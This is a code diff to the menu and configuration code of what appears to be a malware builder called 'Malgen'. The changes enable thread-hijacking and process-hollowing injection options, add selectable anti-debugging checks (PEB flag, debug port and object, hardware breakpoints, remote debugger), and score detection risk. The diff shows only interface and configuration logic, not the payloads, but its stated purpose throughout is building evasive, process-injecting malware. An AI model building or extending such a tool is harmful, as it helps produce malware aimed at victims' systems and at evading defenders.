@@ -48,7 +48,13 @@ VOID CalculateDetectionRisk(const MalgenConfig* config, DetectionRisk* risk) {
         risk->static_risk += 1;
     }
 
-    if (config->anti_analysis.anti_debug) risk->dynamic_risk -= 1;
+    if (config->anti_analysis.anti_debug.check_peb_being_debugged ||
+        config->anti_analysis.anti_debug.check_debug_port ||
+        config->anti_analysis.anti_debug.check_debug_object ||
+        config->anti_analysis.anti_debug.check_hardware_breakpoints ||
+        config->anti_analysis.anti_debug.check_remote_debugger) {
+        risk->dynamic_risk -= 1;
+    }
     if (config->anti_analysis.anti_vm) risk->dynamic_risk -= 1;
     if (config->anti_analysis.anti_sandbox) risk->dynamic_risk -= 1;
 
@@ -139,7 +145,11 @@ const CHAR* GetPersistenceName(PersistenceMethod method) {
 
 VOID GetEvasionSummary(const MalgenConfig* config, CHAR* buffer, SIZE_T size) {
     INT count = 0;
-    if (config->anti_analysis.anti_debug) count++;
+    if (config->anti_analysis.anti_debug.check_peb_being_debugged) count++;
+    if (config->anti_analysis.anti_debug.check_debug_port) count++;
+    if (config->anti_analysis.anti_debug.check_debug_object) count++;
+    if (config->anti_analysis.anti_debug.check_hardware_breakpoints) count++;
+    if (config->anti_analysis.anti_debug.check_remote_debugger) count++;
     if (config->anti_analysis.anti_vm) count++;
     if (config->anti_analysis.anti_sandbox) count++;
     if (config->anti_analysis.obfuscate_strings) count++;
@@ -272,8 +282,8 @@ VOID DeliveryMenu(MalgenConfig* config) {
         printf("injection technique:\n");
         printf("%s CreateRemoteThread\n", selected == 0 ? ">" : " ");
         printf("%s early bird APC\n", selected == 1 ? ">" : " ");
-        printf("%s thread hijacking [not implemented]\n", selected == 2 ? ">" : " ");
-        printf("%s process hollowing [not implemented]\n", selected == 3 ? ">" : " ");
+        printf("%s thread hijacking\n", selected == 2 ? ">" : " ");
+        printf("%s process hollowing\n", selected == 3 ? ">" : " ");
         printf("%s remote mapping\n\n", selected == 4 ? ">" : " ");
 
         printf("API level:\n");
@@ -299,6 +309,12 @@ VOID DeliveryMenu(MalgenConfig* config) {
                 break;
             case 1:
                 config->injection = INJECTION_EARLY_BIRD_APC;
+                break;
+            case 2:
+                config->injection = INJECTION_THREAD_HIJACKING;
+                break;
+            case 3:
+                config->injection = INJECTION_PROCESS_HOLLOWING;
                 break;
             case 4:
                 config->injection = INJECTION_REMOTE_MAPPING;
@@ -367,10 +383,12 @@ VOID EvasionMenu(MalgenConfig* config) {
         printf("                      evasion configuration\n");
         printf("===============================================================\n\n");
 
-        printf("anti-debug: [not implemented]\n");
-        printf("  [%c] IsDebuggerPresent check\n", config->anti_analysis.anti_debug ? 'X' : ' ');
-        printf("  [%c] PEB BeingDebugged flag\n", config->anti_analysis.anti_debug ? 'X' : ' ');
-        printf("  [%c] NtQueryInformationProcess\n\n", config->anti_analysis.anti_debug ? 'X' : ' ');
+        printf("anti-debug:\n");
+        printf("%s [%c] PEB BeingDebugged check\n", selected == 0 ? ">" : " ", config->anti_analysis.anti_debug.check_peb_being_debugged ? 'X' : ' ');
+        printf("%s [%c] NtQueryInformationProcess debug port\n", selected == 1 ? ">" : " ", config->anti_analysis.anti_debug.check_debug_port ? 'X' : ' ');
+        printf("%s [%c] NtQueryInformationProcess debug object\n", selected == 2 ? ">" : " ", config->anti_analysis.anti_debug.check_debug_object ? 'X' : ' ');
+        printf("%s [%c] hardware breakpoints (DR0-DR3)\n", selected == 3 ? ">" : " ", config->anti_analysis.anti_debug.check_hardware_breakpoints ? 'X' : ' ');
+        printf("%s [%c] CheckRemoteDebuggerPresent\n\n", selected == 4 ? ">" : " ", config->anti_analysis.anti_debug.check_remote_debugger ? 'X' : ' ');
 
         printf("anti-VM: [not implemented]\n");
         printf("  [%c] VM artifacts detection\n", config->anti_analysis.anti_vm ? 'X' : ' ');
@@ -383,11 +401,32 @@ VOID EvasionMenu(MalgenConfig* config) {
         printf("obfuscation: [not implemented]\n");
         printf("  [%c] string encryption\n\n", config->anti_analysis.obfuscate_strings ? 'X' : ' ');
 
-        printf("all evasion features planned but not yet implemented.\n\n");
-        printf("esc to go back\n");
+        printf("arrow keys to navigate, enter to toggle, esc to go back\n");
 
         INT key = GetKeyPress();
-        if (key == KEY_ESC) {
+        if (key == KEY_UP && selected > 0) {
+            selected--;
+        } else if (key == KEY_DOWN && selected < 4) {
+            selected++;
+        } else if (key == KEY_ENTER) {
+            switch (selected) {
+            case 0:
+                config->anti_analysis.anti_debug.check_peb_being_debugged = !config->anti_analysis.anti_debug.check_peb_being_debugged;
+                break;
+            case 1:
+                config->anti_analysis.anti_debug.check_debug_port = !config->anti_analysis.anti_debug.check_debug_port;
+                break;
+            case 2:
+                config->anti_analysis.anti_debug.check_debug_object = !config->anti_analysis.anti_debug.check_debug_object;
+                break;
+            case 3:
+                config->anti_analysis.anti_debug.check_hardware_breakpoints = !config->anti_analysis.anti_debug.check_hardware_breakpoints;
+                break;
+            case 4:
+                config->anti_analysis.anti_debug.check_remote_debugger = !config->anti_analysis.anti_debug.check_remote_debugger;
+                break;
+            }
+        } else if (key == KEY_ESC) {
             running = FALSE;
         }
     }
@@ -469,8 +508,8 @@ VOID InjectionMenu(MalgenConfig* config) {
 
         printf("%s CreateRemoteThread\n", selected == INJECTION_CREATE_REMOTE_THREAD ? ">" : " ");
         printf("%s early bird APC\n", selected == INJECTION_EARLY_BIRD_APC ? ">" : " ");
-        printf("%s thread hijacking [not implemented]\n", selected == INJECTION_THREAD_HIJACKING ? ">" : " ");
-        printf("%s process hollowing [not implemented]\n", selected == INJECTION_PROCESS_HOLLOWING ? ">" : " ");
+        printf("%s thread hijacking\n", selected == INJECTION_THREAD_HIJACKING ? ">" : " ");
+        printf("%s process hollowing\n", selected == INJECTION_PROCESS_HOLLOWING ? ">" : " ");
         printf("%s remote mapping\n\n", selected == INJECTION_REMOTE_MAPPING ? ">" : " ");
 
         printf("esc to go back\n");
@@ -481,12 +520,8 @@ VOID InjectionMenu(MalgenConfig* config) {
         } else if (key == KEY_DOWN && selected < 4) {
             selected++;
         } else if (key == KEY_ENTER) {
-            if (selected == INJECTION_CREATE_REMOTE_THREAD ||
-                selected == INJECTION_EARLY_BIRD_APC ||
-                selected == INJECTION_REMOTE_MAPPING) {
-                config->injection = selected;
-                running = FALSE;
-            }
+            config->injection = selected;
+            running = FALSE;
         } else if (key == KEY_ESC) {
             running = FALSE;
         }
